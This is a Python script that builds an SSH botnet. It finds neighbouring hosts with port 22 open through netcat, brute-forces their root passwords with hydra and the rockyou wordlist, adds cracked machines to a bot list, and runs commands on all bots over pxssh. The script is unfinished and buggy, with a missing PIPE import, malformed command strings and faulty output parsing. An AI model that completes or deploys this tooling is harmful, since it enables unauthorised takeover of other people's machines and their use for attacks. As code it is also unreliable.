from pexpect import pxssh
import subprocess
import numpy as np
import re
import get_lan_ip
import getpass


class Bot:

    def __init__(self, host, user, password):
        self.user = user
        self.password = password
        self.host = host
        self.session = self.ssh()

    def ssh(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print('Connection failure.')
            print(e)
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

def command_bots(command):
    for bot in botnet:
        s=bot.ssh()
        bot.session = s
        attack = bot.send_command(command)
        print('Output from ' + bot.host)
        print(attack)

#get target machine
def targets():
    neighbors = get_neighbor()
    known_host = [b.host for b in botnet]
    return list(set(neighbors)-set(known_host))

#ssh open
#netcat -zv host port(22)
def get_neighbor():
    #get all servers that have port 22 open
    neighbors = []
    output = subprocess.Popen(["ip route"],stdout=PIPE)
    response = output.communicate()
    ips = re.findall( r'[0-9]+(?:\.[0-9]+){3}', response)
    #check for open ssh port
    for ip in ips:
        out_2 = subprocess.Popen(["netcat -zv "+ ip + "22"],stdout=PIPE)
        response_2 = output.communicate()
        if "open" not in response_2:
            continue
        neighbors.append(ip)
    return neighbors

#sudo apt-get install hydra hydra-gtk
#hydra -l root -P rockyou.txt -t 4 ip
def hydra(hosts):
    for h in hosts:
        output = subprocess.Popen(["hydra -l root -P rockyou.txt -t 4"+ h], stdout = PIPE)
        response = output.communicate()
        password = response.split("password: ", 1)[1]
        # if password is valid, add the new bot to botnet
        if password is not None:
            add_bot(h,"root",password)

botnet = []
def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)
#local_lan_ip = get_lan_ip
#user = subprocess.check_output(['whoami'])
add_bot('ip','user','password')
command_bots('ls')
